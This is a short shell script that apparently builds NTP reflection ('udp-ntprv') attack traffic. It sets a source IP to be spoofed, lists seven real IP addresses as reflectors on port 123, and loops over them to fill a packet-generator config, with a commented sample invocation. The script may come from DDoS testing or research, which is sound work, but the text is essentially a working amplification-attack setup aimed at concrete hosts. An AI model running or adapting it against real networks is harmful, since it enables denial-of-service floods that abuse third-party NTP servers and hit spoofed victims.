
SRCIP="X"
REFLECTOR="147.228.14.21 147.228.40.40 147.228.52.84 147.228.150.15 147.228.150.16 147.228.190.29 147.228.240.202"
DSTPORT="c16(123)"


#ntpq -c rv reflector
#sh udp-ntprv.sh -s 147.228.52.136 -r 158.196.149.9 -n1 -T5 -g10


TYPE=udp-ntprv
. ./lib.sh

REFLECTOR=$(echo $REFLECTOR | sed 's/\./,/g')

rm ${TYPE}.o
for all in $REFLECTOR; do
	cpp \
		-DDSTMAC="$RMAC" \
		-DSRCMAC="$MYMAC" \
		-DSRCIP="$SRCIP" \
		-DDSTIP="$all" \
		-DDSTPORT="$DSTPORT" \
	${TYPE}.cfg -o - >> ${TYPE}.o
	if [ $? != 0 ]; then
		echo "ERROR: cpp failed"
		exit 1
	fi
done

. ./run.sh
